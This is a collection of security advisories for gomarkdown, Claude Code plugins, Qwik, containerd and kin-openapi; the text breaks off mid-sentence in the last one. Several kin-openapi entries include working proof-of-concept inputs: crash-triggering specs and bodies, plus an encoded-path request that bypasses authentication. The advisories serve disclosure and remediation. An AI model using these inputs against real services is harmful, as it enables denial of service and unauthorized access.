summary: gomarkdown/markdown IsSafeURL panics on short URLs
description:
## Summary

IsSafeURL slices url[:nPath] before checking that len(url) >= nPath, so a URL shorter than a path prefix (0, 1 or 2 bytes) triggers a slice-bounds panic, and this is reached end to end when the html.Safelink hardening flag is enabled and the input contains an empty or very short link destination, giving an unrecoverable crash DoS. Confirmed at HEAD (e08cff8; present since 2022).

## The defect

parser/parser.go, IsSafeURL:

```go
func IsSafeURL(url []byte) bool {
    nLink := len(url)
    for _, path := range validPaths {          // "/", "./", "../"
        nPath := len(path)
        linkPrefix := url[:nPath]               // line 789: sliced BEFORE the length guard
        if nLink >= nPath && bytes.Equal(linkPrefix, path) {   // line 790: guard is too late
            ...
```

url[:nPath] is evaluated before the `nLink >= nPath` check. When len(url) < nPath and cap(url) < nPath, the slice expression panics. Only the relative-path loop is affected; the adjacent URIs loop is already correctly guarded (the signal that this one deviates, the same signal as the anchor). Input: IsSafeURL("") panics ([:1] cap 0), IsSafeURL(".") panics ([:2] cap 1), IsSafeURL("..") panics ([:3] cap 2), while IsSafeURL("/") returns true. End to end: `markdown.ToHTML(input, html.CommonFlags|html.Safelink)` with input `[x]()` panics. Attacker model: (1) any service rendering untrusted Markdown with the html.Safelink flag (the URL-sanitizing hardening flag itself introduces the crash); or (2) any downstream that calls the exported parser.IsSafeURL on a 0/1/2-byte attacker URL, no flag required. No recover() anywhere, so an uncaught crash of the calling goroutine.

## Verification

EXECUTED with negative controls. Direct: the empty/1/2-char cases panic with the exact slice-bounds message while "/" returns true. End to end via ToHTML with html.CommonFlags|html.Safelink: `[x]()` panics, while `[x](/)`, `[x](http://example.com)`, plain text, and `[x](javascript:alert(1))` (safely dropped) do not. NOT verified: how many downstream apps enable Safelink or call IsSafeURL directly (the default no-Safelink render path does not reach it).

## Suggested fix

Move the slice inside the guard: check `nLink >= nPath` first, then compute url[:nPath] (or use bytes.HasPrefix(url, path), which is length-safe). One-line change, mirroring the already-correct URIs loop.

Also checked and sound: CVE-2026-40890 (smartypants smartLeftAngle OOB) is fixed; CVE-2024-44337 (list/paragraph infinite loop) is fixed (deep nesting capped at maxNesting=64); default XSS is by design (Safelink/SkipHTML not in CommonFlags).

## Tooling

AI assistance was used while investigating. The panic is executed-verified with negative controls (IsSafeURL on empty/./.. panics with a slice-bounds error while "/" returns true; ToHTML with html.Safelink on `[x]()` panics while valid and javascript: links do not), and I confirmed at HEAD that IsSafeURL computes url[:nPath] before the `nLink >= nPath` guard.

summary: Claude Code: Plugin Hash Pin Bypass Allows Bypass of Hash Pinning
description:
The plugin install flow in Claude Code and Claude Desktop checked out a marketplace's pinned commit SHA using `git checkout` without verifying that the resulting HEAD matched the pinned SHA. An attacker controlling a plugin's upstream repository could create a branch named identically to the pinned 40-character SHA, causing the checkout to silently resolve to the attacker's branch tip instead of the reviewed commit, resulting in attacker-controlled code being installed bypassing the pinned hash. Exploitation required a user to install a malicious plugin, pin to a safe hash, and for the plugin source to be hosted on a git host that permitted SHA-shaped branch names.

Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.

Thank you to Or Nevo Michrowski of Air Security for reporting this issue.

summary: Qwik: Crashing any Qwik Server via Resource thenable
description:
### Summary

A Qwik server in the default configuration can be crashed with one unauthenticated HTTP request. During qwik-json body parsing, `ResourceSerializer.$fill$` does `Promise.resolve(resource._resolved)`. If `_resolved` is a plain object whose `.then` is a QRL for an unregistered symbol, the async QRL rejects, the rejection is orphaned, and Node terminates the process via its default unhandled-rejection policy.

### Impact

One unauthenticated request crashes the server. Looping keeps every replica dead as long as the attacker sends requests.

summary: containerd CRI plugin: Checkpoint restore bypasses destination security context
description:
### Impact

A vulnerability in containerd's CRI implementation allows a container restored from an untrusted checkpoint via the `CreateContainer` API to bypass the destination security context and execute with elevated privileges. When restoring a container from a checkpoint archive or annotated OCI image, CRIU restores process credentials, Linux capabilities, `no_new_privs`, and seccomp state directly from checkpoint data rather than enforcing the destination CRI `ContainerConfig`. An attacker who can run a container with a crafted checkpoint image can execute processes as root with full capabilities and no enforced seccomp filters despite restrictive security policies requested by the orchestrator. Additionally, containerd's CRI status reporting reflects the requested configuration rather than the actual restored process state, masking the privilege discrepancy from orchestrators. This issue affects Linux systems running containerd with CRI checkpoint restore enabled; users not utilizing CRI checkpoint restore are not affected.

### Patches

This bug has been addressed in containerd 2.2.7 and 2.3.4 by disabling checkpoint restore via `CreateContainer` by default.  The feature has been removed entirely in containerd 2.4.0. Users should update to these versions to resolve the issue. Running containers that were restored from untrusted checkpoints should be stopped, deleted, and recreated.

Users who rely on restore via the `CreateContainer` API can re-enable the feature by setting the new `enable_experimental_restore_via_create` configuration option. However, enabling restore via `CreateContainer` leaves this vulnerability present, as containerd cannot enforce destination security policy during CRIU process restoration. 

### Workarounds

On unpatched versions, containerd does not provide a configuration option to disable checkpoint restore via `CreateContainer`. Deployments should restrict container creation permissions to trusted users, validate container image registries, or use admission controllers to reject images containing checkpoint data.

### References

* [CRIU image security](https://checkpoint-restore.github.io/criu/security/image-security.html)

### Credits

The containerd project would like to thank @l2yyd5 and @berkpolatCE for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)
* Email us at [security@containerd.io](mailto:security@containerd.io)

To report a security issue in containerd:
* [Report a new vulnerability](https://github.com/containerd/containerd/security/advisories/new)
* Email us at [security@containerd.io](mailto:security@containerd.io)

summary: kin-openapi: Incomplete Fix for GHSA-p6wj-qrr4-pgh5: Three Unpatched nil-Items Panic Paths in openapi3filter
description:
## Summary

The fix for GHSA-p6wj-qrr4-pgh5 addressed a nil-pointer dereference that occurs when an OpenAPI 3.1 array schema omits the `items` keyword (which is legal under JSON Schema 2020-12). That fix patched three decoder paths: the standalone `parseArray` function, the top-level array check in `UrlencodedBodyDecoder`, and `MultipartBodyDecoder`.

Three additional crash paths were missed. All of them reach the unguarded `urlValuesDecoder.parseArray` method (`openapi3filter/req_resp_decoder.go:576`) or the unguarded array branch in `buildResObj` (line 1015):

1. **Query parameters** with `type: array` and no `items`.
2. **deepObject** query parameters containing an array property with no `items`.
3. **URL-encoded request bodies** where the array lives inside an `allOf` / `anyOf` / `oneOf` sub-schema. This path bypasses the guard added by the GHSA-p6wj-qrr4-pgh5 fix, because that guard only inspects top-level properties.

Each path is triggerable by an unauthenticated client and produces a deterministic nil-pointer panic during request validation.

## Details
### Root Cause

The three paths patched for GHSA-p6wj-qrr4-pgh5 each received a nil-`items` guard:

```go
// standalone parseArray (line 1143) -- GUARDED
func parseArray(raw []string, schemaRef *openapi3.SchemaRef) ([]any, error) {
	if schemaRef.Value.Items == nil || schemaRef.Value.Items.Value == nil { ... }

// UrlencodedBodyDecoder top-level property loop (line 1441) -- GUARDED
if propSchema.Value.Items == nil || propSchema.Value.Items.Value == nil { ... }

// MultipartBodyDecoder (line 1587) -- GUARDED
if valueSchema.Value.Items == nil { ... }
```

But `urlValuesDecoder.parseArray` (line 576), which handles query-parameter and urlencoded-body array decoding, has **no** such guard:

```go
func (d *urlValuesDecoder) parseArray(raw []string, schemaRef *openapi3.SchemaRef) ([]any, error) {
	var value []any
	for i, v := range raw {
		item, err := d.parseValue(v, schemaRef.Value.Items) // Items is nil -> panic in parseValue
```

`parseValue` immediately dereferences the schema it is handed:

```go
func (d *urlValuesDecoder) parseValue(v string, schema *openapi3.SchemaRef) (any, error) {
	if len(schema.Value.AllOf) > 0 {   // schema == nil here -> nil pointer dereference
```

For the deepObject path, `buildResObj` (line 1015) has the same gap. Its array branch recurses with `schema.Value.Items` (line 1028), which can be nil, and the recursive call dereferences it at line 1015:

```go
case schema.Value.Type.Is("array"):
	// ...
	for i := range arr {
		r, err := buildResObj(params, mapKeys, strconv.Itoa(i), schema.Value.Items) // nil Items
```

For the allOf body path, `UrlencodedBodyDecoder` validates only top-level `schema.Value.Properties` (line 1429-1449). But `decodeSchemaConstructs` (line 1474) recursively walks `AllOf` / `AnyOf` / `OneOf` sub-schemas and calls `decodeProperty` on their properties, which never pass through the top-level guard and reach `urlValuesDecoder.parseArray`.

## Proof of Concept

### Environment

- kin-openapi v0.144.0 (cloned at tag `v0.144.0`, commit `f0407d5`)
- Go 1.26.7
- Each PoC calls `doc.Validate()` first to prove the spec is legal, then drives `openapi3filter.ValidateRequest` directly

### Path 1: Query parameter array without items

Spec (query param `ids` is `type: array`, no `items`), request `GET /test?ids=1&ids=2`:

```
Validate() ACCEPTED the spec (type: array with no items is legal under OAS 3.1)
Calling ValidateRequest directly (no net/http recover)...
panic: runtime error: invalid memory address or nil pointer dereference
[signal 0xc0000005 code=0x0 addr=0x20 ...]
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseValue(...)
	req_resp_decoder.go:605
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseArray(...)
	req_resp_decoder.go:580
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).DecodeArray(...)
	req_resp_decoder.go:569
...
github.com/getkin/kin-openapi/openapi3filter.ValidateRequest(...)
	validate_request.go:83
exit status 2
```

### Path 2: deepObject nested array without items

Spec (deepObject param `filter` with array property `tags`, no `items`), request `GET /test?filter[tags][0]=a`:

```
Validate() ACCEPTED the spec
Calling ValidateRequest directly...
panic: runtime error: invalid memory address or nil pointer dereference
github.com/getkin/kin-openapi/openapi3filter.buildResObj(...)
	req_resp_decoder.go:1012
github.com/getkin/kin-openapi/openapi3filter.buildResObj(...)   <- recursive call with nil Items
	req_resp_decoder.go:1028
github.com/getkin/kin-openapi/openapi3filter.makeObject(...)
	req_resp_decoder.go:947
...
exit status 2
```

### Path 3: URL-encoded body with array inside allOf (bypasses the existing fix)

Spec (urlencoded body, `allOf` sub-schema with array property `tags`, no `items`), request `POST /submit` body `tags=a&tags=b`:

```
Validate() ACCEPTED the spec
Calling ValidateRequest directly...
panic: runtime error: invalid memory address or nil pointer dereference
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseValue(...)
	req_resp_decoder.go:605
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).parseArray(...)
	req_resp_decoder.go:580
github.com/getkin/kin-openapi/openapi3filter.(*urlValuesDecoder).DecodeArray(...)
	req_resp_decoder.go:569
...
github.com/getkin/kin-openapi/openapi3filter.decodeProperty(...)   <- reached via decodeSchemaConstructs (allOf walker)
	req_resp_decoder.go:1519
exit status 2
```

The `decodeProperty` frame confirms the array was reached by walking the `allOf` sub-schema, bypassing the top-level guard that the GHSA-p6wj-qrr4-pgh5 fix added.

### Fix verification

Adding a single nil-`items` guard to `urlValuesDecoder.parseArray` (plus one to the `buildResObj` array branch) turns all three panics into clean validation errors:

```
poc1: Returned normally, err = parameter "ids" in query has an error: array items schema is required for decoding
poc2: Returned normally, err = parameter "filter" in query has an error: path tags: array items schema is required
poc3: Returned normally, err = <nil>   (no panic; the allOf property is skipped by the decoder)
```

This confirms `urlValuesDecoder.parseArray` is the shared root cause for Paths 1 and 3, and `buildResObj` for Path 2.

## Impact

An unauthenticated client can trigger a deterministic nil-pointer panic in request validation with a single crafted request, against any application that validates OAS 3.1 requests with `openapi3filter` where a spec declares an array without `items`.

The severity depends on the host:

| Deployment | Behavior | Availability impact |
|------------|----------|---------------------|
| Standard `net/http` server (validation runs in the handler goroutine) | `net/http` recovers the panic per-connection; the connection is dropped and the process survives | Per-request denial of service (A:L) |
| Non-`net/http` hosts (e.g. fasthttp/connect adapters) or validation performed in an application-spawned goroutine | The panic is not recovered; the process crashes | Full-process denial of service (A:H) |

This was verified in both configurations: under a live `net/http` server the process survived (the panic was logged as `http: panic serving ...` and the process exited 0 at end of test), while the direct-call PoCs above crashed the process with `exit status 2`.

summary: kin-openapi: Uncontrolled Recursion on Circular allOf/anyOf/oneOf Schemas Causes Fatal Process Crash
description:
## Summary

kin-openapi's spec loader and spec-time validator both handle circular schema references safely: the loader resolves circular `$ref`s on purpose (to support recursive data structures), and `Schema.validate()` uses stack-based cycle detection. `Validate()` therefore accepts a schema whose `allOf` / `anyOf` / `oneOf` chain refers back to itself, returning no error.

The runtime validators do not have that protection. When such a schema is used for request or response validation, the recursion through the combinator chain is unbounded. In Go this produces a **fatal stack overflow** (`runtime: goroutine stack exceeds ... limit` / `fatal error: stack overflow`), which is **not** a recoverable panic. `recover()` cannot catch it, so `net/http`'s per-connection recovery does not help. The entire process is terminated, including all goroutines serving unrelated clients.

Two independent unguarded recursion sites were confirmed:

1. `openapi3/schema.go` — `visitJSON` / `visitXOFOperations` (reached by `VisitJSON`, i.e. response validation and direct schema validation).
2. `openapi3filter/req_resp_decoder.go` — `decodeValue` (reached first during request parameter decoding). The report also identifies the same gap in `urlValuesDecoder.parseValue` and `buildResObj`/`buildFromSchemas`.

## Details 
### Root Cause

`Schema.validate()` has cycle detection (`openapi3/schema.go:1396`):

```go
func (schema *Schema) validate(ctx context.Context, stack []*Schema) ([]*Schema, error) {
	if slices.Contains(stack, schema) {
		return stack, nil
	}
	// ...
	stack = append(stack, schema)
```

The runtime visitor has none. `visitJSON` (line 1951) calls `visitXOFOperations` (line 2189), which iterates the combinator slice and calls `visitJSON` again on each sub-schema:

```go
func (schema *Schema) visitXOFOperations(settings *schemaValidationSettings, value any) (err error, run bool) {
	// ...
	for idx, item := range v { // v = schema.OneOf / AnyOf / AllOf
		v := item.Value
		// no check for item.Value == schema (or any ancestor)
		if err := v.visitJSON(settings, tempValue); err != nil { // recurses forever on a cycle
```

The request-decoding path has the same structure in `decodeValue` (`openapi3filter/req_resp_decoder.go:270`):

```go
func decodeValue(dec valueDecoder, param string, sm *openapi3.SerializationMethod, schema *openapi3.SchemaRef, required bool) (any, bool, error) {
	if len(schema.Value.AllOf) > 0 {
		for _, sr := range schema.Value.AllOf {
			value, f, err = decodeValue(dec, param, sm, sr, required) // no cycle check
```

## Proof of Concept

### Environment

- kin-openapi v0.144.0 (tag `v0.144.0`, commit `f0407d5`)
- Go 1.26.7

### Path A: response / direct schema validation (`VisitJSON`)

A schema whose `allOf` refers to itself. `Validate()` is called first to show the schema is accepted, then `VisitJSON()`:

```go
recursiveSchema := &openapi3.Schema{
	Type:       &openapi3.Types{"object"},
	Properties: openapi3.Schemas{"name": {Value: &openapi3.Schema{Type: &openapi3.Types{"string"}}}},
}
recursiveSchema.AllOf = openapi3.SchemaRefs{{Value: recursiveSchema}} // circular

_ = recursiveSchema.Validate(ctx)                       // accepted, no error
_ = recursiveSchema.VisitJSON(map[string]any{"name": "test"}) // crashes
```

Output:

```
Validate() ACCEPTED the circular schema (no error) -- spec-time cycle detection tolerates it
Calling VisitJSON() -- expect fatal stack overflow (unrecoverable)...
runtime: goroutine stack exceeds 1000000000-byte limit
fatal error: stack overflow

goroutine 1 [running]:
github.com/getkin/kin-openapi/openapi3.(*Schema).visitJSON(...)
	openapi3/schema.go:1951
github.com/getkin/kin-openapi/openapi3.(*Schema).visitXOFOperations(...)
	openapi3/schema.go:2309
github.com/getkin/kin-openapi/openapi3.(*Schema).visitJSON(...)
	openapi3/schema.go:1981
github.com/getkin/kin-openapi/openapi3.(*Schema).visitXOFOperations(...)
	openapi3/schema.go:2309
... (repeats until stack overflow)
```

A `defer recover()` placed around the call did **not** catch the fatal error — the process aborted with a non-zero exit code, confirming it is unrecoverable.

### Path B: HTTP request validation against a loaded spec (realistic delivery)

A legal OAS 3.0 spec with a circular `allOf` `$ref`, loaded normally, served behind a standard `net/http` handler using `openapi3filter.ValidateRequest`:

```yaml
openapi: '3.0.0'
info: { title: Circular allOf crash PoC, version: '1.0' }
paths:
  /test:
    get:
      parameters:
        - name: data
          in: query
          schema: { $ref: '#/components/schemas/Recursive' }
      responses: { '200': { description: OK } }
components:
  schemas:
    Recursive:
      type: object
      allOf:
        - $ref: '#/components/schemas/Recursive'
      properties:
        name: { type: string }
```

A single `GET /test?data=x` crashes the whole server process:

```
Validate() ACCEPTED the spec with circular allOf $ref
Sending GET /test?data=x through a real net/http server...
runtime: goroutine stack exceeds 1000000000-byte limit
fatal error: stack overflow
...
github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	openapi3filter/req_resp_decoder.go:278
github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	openapi3filter/req_resp_decoder.go:278
... (repeats until stack overflow)
```

The line printed after the request ("the process survived") was never reached, and the process exited with a non-zero code — the standard `net/http` per-connection `recover()` did not save it. This is the key distinction from a recoverable panic: a fatal stack overflow takes the entire process down regardless of host.

### Fix verification

Adding stack-based cycle detection to both sites (matching `validate()`'s pattern) eliminated the crash:

- `visitJSON` guard: `VisitJSON()` returned normally instead of crashing.
- `decodeValue` guard: the same `GET /test?data=x` returned a clean `400`:

```
Response: 400 "invalid: parameter \"data\" in query has an error: circular schema reference detected while decoding"
If you see this line, the process survived.
```

## Impact

An unrecoverable, whole-process denial of service. Because the crash is a fatal Go runtime error (not a panic), it cannot be contained by `net/http`'s per-request recovery, so **A:H applies to all host types**, unlike a recoverable-panic bug.

Attack surface, in order of exposure:

- **Applications that load OpenAPI specs from untrusted or semi-trusted sources** (API gateways, spec linters/validators, mock servers, documentation generators). An attacker supplies a spec containing a circular combinator, and any subsequent request/response validation crashes the service. This is the primary remote-attacker scenario.
- **Applications serving a fixed, trusted spec that happens to contain a circular `allOf`/`anyOf`/`oneOf`.** Here any client request to the affected endpoint crashes the process. The spec author does not need malicious intent; a degenerate recursive combinator is enough. This is a latent reliability bug that becomes remotely triggerable once present.

summary: kin-openapi: YAML NaN/Inf Values Bypass Built-in Guards and Panic via OAS 3.1 Validation Path
description:
## Summary

kin-openapi guards against `NaN` and `Inf` values in its built-in schema visitor (`visitJSON`) by returning `ErrSchemaInputNaN` / `ErrSchemaInputInf` when a `float64` input violates those constraints. For OAS 3.1 specs, however, `Schema.VisitJSON` routes through `useJSONSchema2020`, which hands the value directly to `santhosh-tekuri/jsonschema/v6` v6.0.2 without applying the same guard.

Inside `jsonschema/v6` v6.0.2, `numValidate` builds a `*big.Rat` from the input via `big.Rat.SetString(fmt.Sprintf("%v", v))`. For `NaN`/`Inf` this parse fails silently and returns `nil`. `numValidate` then dereferences the nil `*big.Rat` (in `math/big.(*Rat).Cmp`), producing a Go runtime panic.

An attacker delivers this by sending an HTTP request with `Content-Type: application/yaml` (or `application/x-yaml`) and a YAML body containing `.nan`, `.inf`, or `-.inf`. The `YamlBodyDecoder` decodes those tokens into `math.NaN()` / `math.Inf(±1)` (standard YAML 1.2 behavior), and they propagate to the unguarded `useJSONSchema2020` path whenever the schema declares a numeric constraint (`minimum`, `maximum`, `exclusiveMinimum`, `exclusiveMaximum`, or `multipleOf`).

## Details
### Root Cause

The built-in visitor `visitJSON` at `openapi3/schema.go:1968` guards NaN/Inf explicitly:

```go
case float64:
    if math.IsNaN(value) {
        return ErrSchemaInputNaN
    }
    if math.IsInf(value, 0) {
        return ErrSchemaInputInf
    }
```

For OAS 3.1 specs, `VisitJSON` dispatches to `useJSONSchema2020` (`openapi3/schema_jsonschema_validator.go:204`), which contains no such guard:

```go
func (schema *Schema) useJSONSchema2020(settings *schemaValidationSettings, value any) error {
    validator, err := newJSONSchemaValidator(schema)
    if err != nil {
        return schema.visitJSON(settings, value)
    }
    return validator.validate(value)      // value handed straight through
}
```

`jsonSchemaValidator.validate` calls `jsonschema/v6.Schema.Validate` (line 146), which reaches `numValidate` in v6.0.2. There, `big.Rat.SetString(fmt.Sprintf("%v", v))` returns `(nil, false)` for `NaN`/`Inf`, and the code dereferences the `nil` `*big.Rat` in `Rat.Cmp`, causing the panic.

## Proof of Concept

### Environment

- kin-openapi v0.144.0 (tag `v0.144.0`, commit `f0407d5`)
- santhosh-tekuri/jsonschema/v6 v6.0.2 (transitive dep)
- Go 1.26.7

### Spec

Minimal OAS 3.1 spec (`spec.yaml`) declaring a YAML body with a numeric constraint:

```yaml
openapi: '3.1.0'
info: { title: Test, version: '1.0' }
paths:
  /test:
    post:
      requestBody:
        required: true
        content:
          application/yaml:
            schema:
              type: number
              minimum: 0
      responses:
        '200': { description: OK }
```

### Trigger

A single `POST /test` with `Content-Type: application/yaml` and body `.nan`, `.inf`, or `-.inf`. All three variants panic:

```
=== RUN   TestNaNInf
[nan]    PANIC (confirms vuln): runtime error: invalid memory address or nil pointer dereference
[inf]    PANIC (confirms vuln): runtime error: invalid memory address or nil pointer dereference
[neginf] PANIC (confirms vuln): runtime error: invalid memory address or nil pointer dereference
```

### Panic stack trace (confirms exact chain)

```
panic: runtime error: invalid memory address or nil pointer dereference

math/big.(*Rat).Cmp(0x0, ...)                                       <- nil *big.Rat dereferenced
    C:/Program Files/Go/src/math/big/rat.go:492
github.com/santhosh-tekuri/jsonschema/v6.(*validator).numValidate(...)
    .../jsonschema/v6@v6.0.2/validator.go:525
github.com/santhosh-tekuri/jsonschema/v6.(*validator).validate(...)
    .../jsonschema/v6@v6.0.2/validator.go:168
github.com/santhosh-tekuri/jsonschema/v6.(*Schema).validate(...)
    .../jsonschema/v6@v6.0.2/validator.go:34
github.com/getkin/kin-openapi/openapi3.(*jsonSchemaValidator).validate(...)
    openapi3/schema_jsonschema_validator.go:146
github.com/getkin/kin-openapi/openapi3.(*Schema).useJSONSchema2020(...)   <- MISSING NaN/Inf guard
    openapi3/schema_jsonschema_validator.go:211
github.com/getkin/kin-openapi/openapi3.(*Schema).VisitJSON(...)
    openapi3/schema.go:1946
github.com/getkin/kin-openapi/openapi3filter.ValidateRequestBody(...)
    openapi3filter/validate_request.go:364
github.com/getkin/kin-openapi/openapi3filter.ValidateRequest(...)
    openapi3filter/validate_request.go:96
```

### net/http behavior (severity nuance)

Behind a standard `net/http` server, the panic is recovered per-connection. The client sees a dropped connection; the server process continues:

```
Sending POST /test body=.nan against real net/http server...
2026/08/25 http: panic serving 127.0.0.1:40625: runtime error: invalid memory address or nil pointer dereference
CLIENT ERROR (connection dropped): Post ".../test": EOF
Process still alive after request: true
```

This is a **recoverable panic**, unlike the recursion finding. `recover()` catches it (verified by capturing the panic value in a `defer` in the same goroutine). Non-`net/http` hosts or validation performed in an application-spawned goroutine are not covered by that recovery and would experience a full-process crash.

### Fix verification

Upgrading only the transitive dependency to `jsonschema/v6@v6.0.3` (via `go get github.com/santhosh-tekuri/jsonschema/v6@v6.0.3`) eliminates the panic entirely; all three payloads return a clean validation error:

```
[nan]    Returned normally, err = request body has an error: doesn't match schema: validation failed due to: at '': invalid jsonType float64
[inf]    Returned normally, err = request body has an error: doesn't match schema: validation failed due to: at '': invalid jsonType float64
[neginf] Returned normally, err = request body has an error: doesn't match schema: validation failed due to: at '': invalid jsonType float64
```

This confirms the upstream `jsonschema/v6` v6.0.3 release treats the NaN/Inf case as a bug and fixes it at the source. It also confirms `useJSONSchema2020` is the reachable path: patching only the transitive dep removes the panic without touching kin-openapi code.

## Why This Is a Vulnerability, Not by Design

- The library explicitly refuses NaN/Inf in its own visitor (`ErrSchemaInputNaN` / `ErrSchemaInputInf` at `schema.go:1968`). The stated policy is: these values are not allowed.
- The OAS 3.1 dispatch (`useJSONSchema2020`) simply omits the same guard — a coding gap, not a design decision.
- Upstream `jsonschema/v6` v6.0.3 fixes the same case as a bug. Two independent code owners agree it should not panic.
- The trigger is a single HTTP request body an unauthenticated client can send. There is no legitimate content-authoring reason to submit `.nan` / `.inf` as a numeric field.

## Impact

- **Per-request denial of service (net/http hosts).** Every crafted request kills its own connection with zero attacker cost. Sustained flooding degrades service reliability and log noise.
- **Full-process denial of service (non-net/http hosts or goroutine-spawned validation).** No `net/http` recovery wrapper is present; the whole process crashes on a single request.
- **Attack surface is any OAS 3.1 API that accepts YAML bodies with numeric constraints.** These constraints (`minimum`, `maximum`, `exclusiveMinimum`, `exclusiveMaximum`, `multipleOf`) are common on any numeric field with a range.

summary: kin-openapi: ValidationHandler security-requirement bypass via encoded-path operation confusion
description:
## Summary

`openapi3filter.ValidationHandler.Middleware` validates requests with kin-openapi's
legacy router, which selects an OpenAPI operation from the decoded `URL.Path`. The
method is documented as implementing `gorilla/mux.MiddlewareFunc`, but a downstream
gorilla/mux router configured with `UseEncodedPath()` selects its handler from the
encoded representation (`URL.RawPath`).

An unauthenticated request such as `/public%2Fstatus` can therefore be validated as an
intentionally public operation (`/public/status`) and then dispatched to a protected
operation (`/{id}`). The configured, rejecting `AuthenticationFunc` is never invoked,
and the protected downstream handler runs.

This is distinct from GHSA-r277-6w6q-xmqw. The behavior below uses an explicit
authentication callback that rejects missing credentials and remains reproducible
after the v0.144.0 fix for the unsafe default callback.

## Affected products

- Product: `github.com/getkin/kin-openapi`
- Component: `openapi3filter.ValidationHandler.Middleware`
- Confirmed post-GHSA affected releases: v0.144.0, v0.145.0, and v0.146.0
- Reporter attestation: each listed release was checked out separately, the attached
  single-file test was copied into `openapi3filter/`, and that test passed; maintainers
  should independently confirm the version range
- Confirmed affected development revision: `d33e44e67734dcde81b576582185e1343fb3985d`
- v0.143.0 also reproduces this mechanism, but GHSA-r277-6w6q-xmqw already provides a
  simpler bypass on that release; the distinct post-fix claim starts at v0.144.0
- Earlier releases: not tested; please treat the introduction boundary as unknown

## Security impact

An unauthenticated remote requester can reach a handler whose OpenAPI operation
requires authentication when all of the following are true:

1. the application uses `ValidationHandler.Middleware` as the security gate;
2. the downstream router preserves and interprets an encoded path, such as
   gorilla/mux with `UseEncodedPath()`;
3. a public exact route and a protected parameterized route overlap after decoding;
4. the public and protected operations expose the same HTTP method;
5. the protected handler relies on the validation layer's security decision.

The protected operation's path-parameter value is constrained: it is an encoded
representation that decodes to a public literal path (`public%2Fstatus` in this PoC),
not an arbitrary attacker-selected identifier. A protected operation without a
compatible parameterized path is not reachable through this specific mechanism.

- Primitive: the security decision is made for a different OpenAPI operation than the
  operation dispatched by the application router.
- Demonstrated impact: a protected handler executes while the explicitly rejecting
  `AuthenticationFunc` is never invoked.
- Impact ceiling: confidentiality or integrity loss when the reachable protected
  handler has that authority; the PoC does not demonstrate data disclosure or state
  modification.
- Availability impact: not demonstrated.

## Root cause

At the confirmed development revision:

- `openapi3filter/validation_handler.go`: `ValidationHandler.Load` constructs
  `routers/legacy.NewRouter` unconditionally.
- `routers/legacy/router.go`: route selection uses the decoded request path.
- `routers/gorillamux/router.go`: the kin-openapi gorilla router constructs a
  gorilla/mux router with `UseEncodedPath()`.
- `ValidationHandler.Middleware` forwards the unchanged request after validation.

The component making the authentication decision and the component dispatching the
handler can therefore disagree about the selected operation.

## Reproduction

The attached PoC uses a real `net/http` server, an explicit API-key callback that
rejects missing credentials, and a downstream gorilla/mux router with
`UseEncodedPath()`.

From a kin-openapi checkout, copy the self-contained attachment
`encoded_path_route_confusion_test.go.txt` into `openapi3filter/` as
`encoded_path_route_confusion_test.go`, then run:

```sh
go test -v ./openapi3filter -run '^TestEncodedPathAuthorizationBypass$' -count=1
```

Expected attack observation:

```text
status=202 downstream_route=/{id} protected_id=public%2Fstatus authentication_calls=0
wiring=Router.Use status=202 downstream_route=/{id} protected_id=public%2Fstatus authentication_calls=0
```

Controls included in the test show that:

- `/ordinary` selects the protected operation, invokes authentication once, and is
  rejected with HTTP 401;
- `/public/status` reaches only the intentionally public handler;
- the encoded request reaches the protected `/{id}` handler with HTTP 202 while the
  authentication callback remains uncalled;
- both external wrapping and the documented
  `router.Use(validationHandler.Middleware)` wiring reproduce the same result.

## Reverse-proxy reachability

The same request was reproduced through Nginx 1.31.3 using the official
`nginx:alpine` image digest
`sha256:4a73073bd557c65b759505da037898b61f1be6cbcc3c2c3aeac22d2a470c1752`.

The exact container invocation was:

```sh
docker run --rm --name kin-openapi-nginx \
  --add-host=host.docker.internal:host-gateway \
  -p 18081:8080 -p 18082:8081 \
  -v "$PWD/poc/nginx.conf:/etc/nginx/nginx.conf:ro" \
  nginx:alpine
```

Container port 8080 uses `proxy_pass http://host.docker.internal:18080;` without a
replacement URI. Host port 18081 therefore preserved `/public%2Fstatus`; the protected
handler returned HTTP 202 and the
authentication callback remained at zero calls. With
`proxy_pass http://host.docker.internal:18080/;` on container port 8081 / host port
18082, Nginx canonicalized the upstream URI; both layers selected `/public/status` and
the bypass did not occur.

Nginx access-log observations:

```text
server_port=8080 "GET /public%2Fstatus HTTP/1.1" 202 0 "curl/8.7.1"
server_port=8081 "GET /public%2Fstatus HTTP/1.1" 204 0 "curl/8.7.1"
server_port=8080 "GET /ordinary HTTP/1.1" 401 0 "curl/8.7.1"
```

The response route headers were `X-Poc-Route: /{id}` on the preserving listener and
`X-Poc-Route: /public/status` on the canonicalizing listener. Backend observations for
the two requests were:

```text
request_uri="/public%2Fstatus" path="/public/status" raw_path="/public%2Fstatus" auth_before=0
completed request_uri="/public%2Fstatus" auth_after=0
request_uri="/public/status" path="/public/status" raw_path="" auth_before=0
completed request_uri="/public/status" auth_after=0
```

This control shows that upstream path handling is a deployment precondition rather
than claiming that every proxy configuration is affected.

The canonical protected control produced:

```text
request_uri="/ordinary" path="/ordinary" raw_path="" auth_before=0
completed request_uri="/ordinary" auth_after=1
```

## Suggested remediation

The authentication layer and downstream dispatcher must select the same OpenAPI
operation from the same request representation.

Potential approaches:

1. make `ValidationHandler` accept a caller-supplied `routers.Router` and require it to
   match downstream routing semantics;
2. document that `NewValidator` already accepts a router but is safe only when the
   supplied router selects operations using the same semantics as the dispatcher;
   callers must also supply an `AuthenticationFunc` through `ValidationOptions`, or
   protected requests fail with the existing missing-authentication-service error;
3. as an interim hardening option, make `ValidationHandler` fail closed on an encoded
   path separator when `URL.Path` and `URL.RawPath` can select different operations,
   and verify this behavior against the full suite;
4. document the route-identity requirement and add encoded-separator regression tests.

Replacing the legacy router with the kin-openapi gorilla router closes this PoC, but a
